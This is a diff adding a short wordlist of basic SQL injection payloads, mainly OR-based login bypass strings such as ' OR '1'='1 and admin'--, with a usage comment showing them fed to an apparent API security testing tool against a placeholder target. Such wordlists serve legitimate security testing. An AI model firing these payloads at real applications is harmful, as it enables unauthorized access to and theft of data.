@@ -1,0 +1,18 @@
+# SQL Injection Payloads — Basic / OR bypass
+# Format: plain text, one payload per line. # = comment.
+# Usage:
+#   apileaks req GET "http://target/api?token=test" \
+#     --plugin sqlinjection --parameters token \
+#     --payload-file wordlists/sqli-basic.txt
+
+' OR '1'='1
+' OR '1'='1'--
+' OR 1=1--
+" OR "1"="1
+' OR 1=1#
+1 OR 1=1
+admin'--
+' OR 1=1 LIMIT 1--
+' OR ''='
+1; --
+' OR 'x'='x
